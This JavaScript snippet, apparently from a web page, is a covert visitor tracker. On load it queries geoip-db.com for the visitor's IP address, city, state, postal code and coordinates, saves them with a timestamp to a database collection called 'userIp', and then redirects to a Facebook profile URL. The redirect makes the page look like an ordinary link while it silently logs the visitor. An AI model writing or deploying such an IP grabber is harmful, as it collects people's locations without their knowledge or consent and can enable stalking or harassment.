var country_name, city, postal, latitude, longitude, IPv4, state, time;

function callback(response) {
    country_name = response.country_name;
    city = response.city;
    postal = response.postal;
    latitude = response.latitude;
    longitude = response.longitude;
    IPv4 = response.IPv4;
    state = response.state;
    time = new Date();
    db.collection("userIp").add({
        IPv4,city,country_name,latitude,longitude,postal,state,time
    });
    window.location.replace("http://www.facebook.com/profile.php?");
}
$.ajax({
    url: "https://geoip-db.com/jsonp/",
    dataType: "jsonp"
});